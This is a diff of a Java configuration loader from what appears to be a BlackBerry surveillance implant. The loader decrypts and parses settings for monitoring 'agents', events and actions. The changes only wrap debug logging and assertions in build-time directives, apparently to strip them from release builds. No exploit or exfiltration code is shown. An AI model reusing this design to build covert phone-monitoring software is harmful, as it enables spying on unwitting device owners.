@@ -33,7 +33,7 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public class Conf {
 
-    /** The debug. */
+    /** The debug instance. */
     private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
 
     public static final String NEW_CONF = "newconfig.dat";
@@ -136,10 +136,12 @@ public class Conf {
         if (file.exists()) {
             ret = loadCyphered(file.read(), confKey);
             if (ret) {
-                debug.info("Forced config");
+                // #debug
+                 debug.info("Forced config");
                 return true;
             } else {
-                debug.error("Reading forced configuration");
+                // #debug
+                 debug.error("Reading forced configuration");
                 file.delete();
             }
         }
@@ -149,11 +151,13 @@ public class Conf {
             ret = loadCyphered(file.read(), confKey);
 
             if (ret) {
-                debug.info("New config");
+                // #debug
+                 debug.info("New config");
                 file.rename(Conf.ACTUAL_CONF);
                 return true;
             } else {
-                debug.error("Reading new configuration");
+                // #debug
+                 debug.error("Reading new configuration");
                 file.delete();
             }
         }
@@ -162,23 +166,29 @@ public class Conf {
         if (file.exists()) {
             ret = loadCyphered(file.read(), confKey);
             if (ret) {
-                debug.info("Actual config");
+                // #debug
+                 debug.info("Actual config");
                 return true;
             } else {
-                debug.error("Reading actual configuration");
+                // #debug
+                 debug.error("Reading actual configuration");
                 file.delete();
             }
         }
 
-        debug.warn("Reading Conf from resourses");
+        // #debug
+         debug.warn("Reading Conf from resourses");
 
         InputStream i0 = Conf.class.getResourceAsStream("config/config.bin");
         if (i0 != null) {
-            Check.asserts(i0 != null, "Resource config");
+            // #ifdef DBC
+//@                        Check.asserts(i0 != null, "Resource config");
+            // #endif
             ret = loadCyphered(i0, confKey);
 
         } else {
-            debug.error("Cannot read config from resources");
+            // #debug
+             debug.error("Cannot read config from resources");
             ret = false;
         }
 
@@ -206,7 +216,8 @@ public class Conf {
             ret = loadCyphered(cyphered, confKey);
 
         } catch (IOException e) {
-            debug.error("Cannot read cyphered");
+            // #debug
+             debug.error("Cannot read cyphered");
         }
 
         return ret;
@@ -219,13 +230,15 @@ public class Conf {
         final int cryptoOffset = 8;
 
         len = cyphered.length;
-        debug.trace("cypher len: " + len);
+        // #debug
+         debug.trace("cypher len: " + len);
 
         Encryption crypto = new Encryption();
         crypto.makeKey(confKey);
 
         byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
-        debug.trace("plain len: " + plainconf.length);
+        // #debug
+         debug.trace("plain len: " + plainconf.length);
         cyphered = null;
 
         // lettura della configurazione
@@ -245,7 +258,8 @@ public class Conf {
      */
     boolean parseAction(DataBuffer databuffer) throws EOFException {
         if (actionIndex < 0) {
-            debug.trace("ParseAction - NO SECTION");
+            // #debug
+             debug.trace("ParseAction - NO SECTION");
             return false;
         }
 
@@ -253,10 +267,12 @@ public class Conf {
 
         int numTokens = databuffer.readInt();
 
-        debug.trace("ParseAction - numTokens: " + numTokens);
+        // #debug
+         debug.trace("ParseAction - numTokens: " + numTokens);
 
         for (int idAction = 0; idAction < numTokens; idAction++) {
-            debug.trace("ParseEvent - Action: " + idAction);
+            // #debug
+             debug.trace("ParseEvent - Action: " + idAction);
             Action action = new Action(idAction);
 
             int numSubActions = databuffer.readInt();
@@ -268,14 +284,16 @@ public class Conf {
                 byte[] confParams = new byte[paramLen];
                 databuffer.readFully(confParams);
 
-                debug.trace("ParseEvent - addNewSubAction: " + actionType);
+                // #debug
+                 debug.trace("ParseEvent - addNewSubAction: " + actionType);
                 action.addNewSubAction(actionType, confParams);
             }
 
             statusObj.addAction(action);
         }
 
-        debug.trace("ParseAction - OK");
+        // #debug
+         debug.trace("ParseAction - OK");
 
         return true;
     }
@@ -291,7 +309,8 @@ public class Conf {
      */
     boolean parseAgent(DataBuffer databuffer) throws EOFException {
         if (agentIndex < 0) {
-            debug.trace("ParseAgent - NO SECTION");
+            // #debug
+             debug.trace("ParseAgent - NO SECTION");
             return false;
         }
 
@@ -299,7 +318,8 @@ public class Conf {
 
         int numTokens = databuffer.readInt();
 
-        debug.trace("ParseAgent - numTokens: " + numTokens);
+        // #debug
+         debug.trace("ParseAgent - numTokens: " + numTokens);
 
         for (int i = 0; i < numTokens; i++) {
             int agentType = databuffer.readInt();
@@ -309,15 +329,18 @@ public class Conf {
             byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
-            debug.trace("ParseAgent - factory: " + agentType + " status: "
-                    + agentStatus);
+            // #mdebug
+             debug.trace("ParseAgent - factory: " + agentType + " status: "
+             + agentStatus);
+            // #enddebug
 
             boolean enabled = agentStatus == Common.AGENT_ENABLED;
             Agent agent = Agent.factory(agentType, enabled, confParams);
             statusObj.addAgent(agent);
         }
 
-        debug.trace("ParseAgent - OK");
+        // #debug
+         debug.trace("ParseAgent - OK");
 
         return true;
     }
@@ -334,7 +357,7 @@ public class Conf {
     public boolean parseConf(byte[] plainConf, int offset) {
         DataBuffer databuffer = new DataBuffer(plainConf, offset,
                 plainConf.length - offset, false);
-        
+
         // Check crc e sezioni
         try {
             // leggo la lunghezza del plain
@@ -343,16 +366,19 @@ public class Conf {
             int payloadSize = len - 4;
 
             if (len <= 0 || payloadSize <= 0) {
-                debug.error("Conf len error");
+                // #debug
+                 debug.error("Conf len error");
                 return false;
             }
-            
+
             byte[] payload = new byte[0];
 
-            debug.trace("Allocating size:" + payloadSize);
+            // #debug
+             debug.trace("Allocating size:" + payloadSize);
 
             if (payloadSize > plainConf.length) {
-                debug.error("wrong decoding len");
+                // #debug
+                 debug.error("wrong decoding len");
                 return false;
             }
 
@@ -369,55 +395,65 @@ public class Conf {
             boolean crcOK = crcVerify(payload, crcExpected);
 
             if (!crcOK) {
-                debug.error("ParseConf - CRC FAILED");
+                // #debug
+                 debug.error("ParseConf - CRC FAILED");
                 return false;
             }
 
             // verifica sezioni
             searchSectionIndex(payload);
 
-            Check.asserts(
-                    endofIndex + ENDOF_CONF_DELIMITER.length() + 4 == len,
-                    "ENDOF Wrong");
-
-            //debug.trace("ParseConf - CRC OK");
+            // #ifdef DBC
+//@                        Check.asserts(                  
+//@                                endofIndex + ENDOF_CONF_DELIMITER.length() + 4 == len,
+//@                                "ENDOF Wrong");
+            // #endif
+            //#debug
+            debug.trace("ParseConf - CRC OK");
 
         } catch (EOFException e) {
-            debug.error("ParseConf - FAILED");
+            // #debug
+             debug.error("ParseConf - FAILED");
             return false;
         }
 
         // Sezione Agenti
         try {
             if (!parseAgent(databuffer)) {
-                debug.error("ParseAgent - FAILED [0]");
+                // #debug
+                 debug.error("ParseAgent - FAILED [0]");
                 return false;
             }
 
             // Sezione Eventi
             if (!parseEvent(databuffer)) {
-                debug.error("ParseEvent - FAILED [1]");
+                // #debug
+                 debug.error("ParseEvent - FAILED [1]");
                 return false;
             }
 
             // Sezione Azioni
             if (!parseAction(databuffer)) {
-                debug.error("ParseAction - FAILED [2]");
+                // #debug
+                 debug.error("ParseAction - FAILED [2]");
                 return false;
             }
 
             // Leggi i parametri di configurazione
             if (!parseParameters(databuffer)) {
-                debug.error("ParseParameters - FAILED [3]");
+                // #debug
+                 debug.error("ParseParameters - FAILED [3]");
                 return false;
             }
 
         } catch (EOFException e) {
-            debug.error("ParseConf - FAILED:" + e);
+            // #debug
+             debug.error("ParseConf - FAILED:" + e);
             return false;
         }
 
-        debug.trace("ParseConf - OK");
+        // #debug
+         debug.trace("ParseConf - OK");
         return true;
     }
 
@@ -432,7 +468,8 @@ public class Conf {
      */
     boolean parseEvent(DataBuffer databuffer) throws EOFException {
         if (eventIndex < 0) {
-            debug.trace("ParseEvent - NO SECTION");
+            // #debug
+             debug.trace("ParseEvent - NO SECTION");
             return false;
         }
 
@@ -440,7 +477,8 @@ public class Conf {
 
         int numTokens = databuffer.readInt();
 
-        debug.trace("ParseEvent - numTokens: " + numTokens);
+        // #debug
+         debug.trace("ParseEvent - numTokens: " + numTokens);
 
         for (int i = 0; i < numTokens; i++) {
             int eventType = databuffer.readInt();
@@ -450,13 +488,17 @@ public class Conf {
             byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
-            debug.trace("ParseEvent - factory: " + i + " type: " + eventType
-                    + " action: " + actionId);
+            // #mdebug
+             debug.trace("ParseEvent - factory: " + i
+             + " type: " + eventType
+             + " action: " + actionId);
+            // #enddebug
             Event event = Event.factory(i, eventType, actionId, confParams);
             statusObj.addEvent(i, event);
         }
 
-        debug.trace("ParseEvent - OK");
+        // #debug
+         debug.trace("ParseEvent - OK");
 
         actionIndex = databuffer.getPosition();
 
@@ -474,7 +516,8 @@ public class Conf {
      */
     boolean parseParameters(DataBuffer databuffer) throws EOFException {
         if (mobileIndex < 0) {
-            debug.trace("ParseParameters - NO SECTION");
+            // #debug
+             debug.trace("ParseParameters - NO SECTION");
             return false;
         }
 
@@ -482,7 +525,8 @@ public class Conf {
 
         int numTokens = databuffer.readInt();
 
-        debug.trace("ParseParameters - numTokens: " + numTokens);
+        // #debug
+         debug.trace("ParseParameters - numTokens: " + numTokens);
 
         for (int i = 0; i < numTokens; i++) {
             int confId = databuffer.readInt();
@@ -505,21 +549,19 @@ public class Conf {
      *            the payload
      */
     public void searchSectionIndex(byte[] payload) {
-        // AGENT_CONF_DELIMITER ="AGENTCONFS-"; // Configurazione degli agenti
-        // EVENT_CONF_DELIMITER ="EVENTCONFS-"; // Configurazione degli eventi
-        // MOBIL_CONF_DELIMITER ="MOBILCONFS-"; // Opzioni per le piattaforme
-        // mobili
-        // ENDOF_CONF_DELIMITER ="ENDOFCONFS-"; // Marker di fine configurazione
-
         agentIndex = Utils.getIndex(payload, AGENT_CONF_DELIMITER.getBytes());
         eventIndex = Utils.getIndex(payload, EVENT_CONF_DELIMITER.getBytes());
         mobileIndex = Utils.getIndex(payload, MOBIL_CONF_DELIMITER.getBytes());
         // actionIndex=getIndex(payload,AGENT_CONF_DELIMITER.getBytes());
         endofIndex = Utils.getIndex(payload, ENDOF_CONF_DELIMITER.getBytes());
 
-        debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
-        debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
-        debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
-        debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
+        // #debug
+         debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
+        // #debug
+         debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
+        // #debug
+         debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
+        // #debug
+         debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
     }
 }
